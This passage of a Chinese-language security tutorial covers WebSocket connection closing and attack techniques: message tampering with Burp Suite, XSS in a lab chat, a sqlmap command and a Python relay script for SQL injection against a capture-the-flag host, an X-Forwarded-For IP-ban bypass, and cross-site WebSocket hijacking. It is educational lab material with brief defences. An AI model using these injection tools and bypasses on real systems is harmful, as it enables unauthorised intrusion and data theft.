在发送指示应该关闭连接的控制帧之后，对等体不发送任何进一步的数据，在接收到指示应该关闭连接的控制帧之后，对等体丢弃接收到的任何进一步的数据且不再做任何处理，同时两个对等方同时发起此握手也是安全的，关闭握手旨在补充TCP关闭握手(FIN/ACK)，因为TCP关闭握手并不总是端到端可靠的，特别是在存在拦截代理和其他中介的情况下，通过发送Close帧并等待响应的Close帧，避免了数据可能不必要丢失的某些情况，例如：在某些平台上，如果套接字被接收队列中的数据关闭，则会发送RST数据包，这将导致接收RST的一方的recv()失败，即使有数据等待读取
#### 演示实例
我们接着上面的演示示例点击"断开"使得已经建立的WebSocket连接直接断开
WireShark抓包如下：  
客户端发送断开链接请求(这里的Opcode 8标识此帧为关闭帧)
服务器端收到关闭帧并断开链接  
## 安全风险
WebSocket作为一种通信协议其主要的功能其实还是实现通信并完成客户端与服务器端的数据的交互，而且在此过程中自然而然少不了会牵扯到相关的业务功能，也就自然会存在可以被攻击者实施攻击的脆弱点，下面我们对几个WebSocket的安全风险进行简单介绍
### 操纵消息
#### 基本介绍
在对网站进行安全测试时我们可以使用Burpsuite代理拦截整个通信数据，如果我们在Burpsuite中的"Proxy"界面的"WebSockets
History"选项卡中看到有交互数据或者在HTTP Proxy中发现有回显"101 Switching
Protocol"则说明网站有使用到WebSocket，在进行测试时我们其实是可以通过Burpsuite对WebSocket的通信数据包进行拦截和恶意修改处理的，整个步骤大致如下：  
Step 1：在浏览器中设置Burpsuite代理  
Step 2：使用浏览器访问目标网站，经过一段时间的测试后发现网站使用了WebSocket  
Step 3：进入到"Proxy-Intrude"模块下开启拦截，之后对整个通信数据包进行拦截处理并筛选WebSocket通信数据  
Step 4：成功拦截到WebSocket通信数据后可以对请求数据参数进行Fuzzing，例如：SQL注入、XSS、SSRF等攻击手法
#### 简易实例1
这里我们通过靶场来对操纵WebSocket数据进行攻击进行一个简单的演示，这里我们使用到的攻击类型为XSS攻击，它主要是指攻击者通过利用研发人员对用户的输入未做过滤或过滤不严以及输出未做编码的场景构造恶意代码并将其成功插入网页或后端数据库，在用户访问页面时来触发恶意载荷的执行并实现窃取用户个人信息、进行蠕虫传播的一种常见的攻击手法，目前比较常见的攻击方式主要分为存储型XSS、DOM型XSS、反射性XSS，而我们WebSocket中最为常见的应该属于反射性XSS  
实验环境：  
实验目的：使用WebSocket消息来触发一个alert()，支持代理浏览器中的弹出窗口  
实验步骤：  
Step 1：打开靶场环境之后点击Live Chat  
Step 2：抓包发送一条数据，并在WebSockets History中查看数据，修改包构造成XSS的POC
#### 简易实例2
在学习WebSocket安全攻击手法的同时看到windcctv师傅介绍的一个关于WebSocket通过篡改数据包达到SQL注入漏洞利用的案例，由于网站已然无法访问，故而这边简单梳理一下其流程，首先是在信息收集期间发现目标站点实例WebSocket
通过对参数进行反复的修改和测试最终发现参数params存在注入  
之后直接使用sqlmap：
    sqlmap --url "ws://10.10.10.232/ws/" --data='{"params":"help","token":"a5e6c5aade60a2c4619893218280a45d2a142e3bcf583c8e1955c0b579f13009"}' -v 3 --dbs
payload如下所示：  
经过多次尝试都没有成功，之后通过中转脚本的方式成功实现了注入：
    from websocket import create_connection
    import re
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from urllib.parse import unquote
    import threading
    from socketserver import ThreadingMixIn
    hostname = "localhost"
    serverport = 9000
    def xt(msg):
        matches = re.findall(r'token":"(.*?)"', msg)
        return matches[0]
    def send_msg(msg):
        resp = ""
        ws = create_connection("ws://gym.crossfit.htb/ws")
        resp =  ws.recv()
        cur_token = xt(resp)
        msg = unquote(msg)
        msg = msg.replace('"', "'")
        d = '{"message":"available","params":"'+msg+'","token":"' + cur_token + '"}'
        print(d)
        ws.send(d)
        resp = ws.recv()
        #print(resp)
        matches = re.findall(r'message":"(.*?)"', resp)
        print(matches[0])
        return matches[0]
    #send_msg("1 and 2=2-- -")
    #send_msg("1 and 'a'='a'-- -")
    #exit(0)
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            param = self.path[5:]
            self.send_header('Content-Type', 'text')
            self.end_headers()
            resp = send_msg(param)
            self.wfile.write(bytes(resp, "utf-8"))
    class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
        pass
    def run():
        server = ThreadingSimpleServer(('0.0.0.0', 9000), Handler)
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            pass
    if __name__ == '__main__':
        run()
运行结果如下：  
#### 防御措施
后段服务器对传递过来的所有数据进行过滤检查，一律秉持不信任的原则进行检查
### 握手过程
#### 基本介绍
部分WebSocket漏洞只能通过操纵WebSocket握手来发现和利用，这些漏洞往往涉及设计缺陷，例如:  
应用程序使用的自定义HTTP头引入的攻击面  
在HTTP标头中放错位置的信任以执行安全性决策，例如：X-Forwarded-For标头  
会话处理机制存在缺陷，因为处理WebSocket消息的会话上下文通常由握手消息的会话上下文确定
#### 简易实例
实验环境：  
实验目的：使用WebSocket消息来触发一个alert()，支持代理浏览器中的弹出窗口
#### 实验步骤
Step 1：打开靶场环境之后点击Live Chat  
Step 2：与上面的XSS一致提交payload进行测试
之后可以看到攻击已被阻止，重新加载页面时发现连接尝试失败，因为IP地址已被禁止  
Step 2：重新抓取请求包并提添加X-Forwarded-For请求头
    X-Forwarded-For:127.0.0.1
之后再次回到页面：  
Step 3：之后再次尝试有效的XSS载荷
Step 4：之后成功触发恶意载荷
#### 防御措施
对于请求头中的各类数据(例如:X-Forwarded-For)一律秉持不信任原则(除去部分WebSocket建立连接时的必要请求头外)且不将请求头中的数据存储至数据库
### CSWSH
#### 基本介绍
Cross-Site WebSocket
Hijacking也就是跨域WebSocket劫持攻击，它是基于WebSocket的握手过程进行的CSRF攻击，而造成这种攻击的根本原因在于WebSocket协议在握手阶段是基于HTTP的，它在握手期间没有规定服务器如何验证客户端的身份，因此服务器需要采用HTTP客户端认证机制来辨明身份，比如:常见的Cookie、http头基本认证等，这就导致了容易被攻击者利用恶意网页伪装用户的身份与服务器建立WebSocket连接，CSWSH与跨站请求伪造CSRF的漏洞原理极其类似，相较于CSRF漏洞只能发送伪造请求，跨站WebSocket劫持漏洞却可以建立了一个完整的读/写双向通道且不受同源策略的限制，这在很大意义上都造成了更大的危害和可操作性，通过跨站点WebSocket劫持我们可以进行如下攻击：
  * 越权攻击：熟知的访问控制，垂直越权与水平越权
  * 信息泄露：因为WebSocket的通信是全双工通信的，所以用户与服务器之间交互的信息有可能被攻击者监听，这种监听是无声的监听，被攻击者不知道自己处于被监听状态，从而造成信息泄露
#### 利用关键
CSWSH漏洞利用的关键点是服务端没有对Origin头部进行校验导致成功握手并切换到WebSocket协议，恶意网页之后就可以成功绕过身份认证连接到WebSocket服务器，进而窃取到服务器端发来的信息或者发送伪造信息到服务器端篡改服务器端数据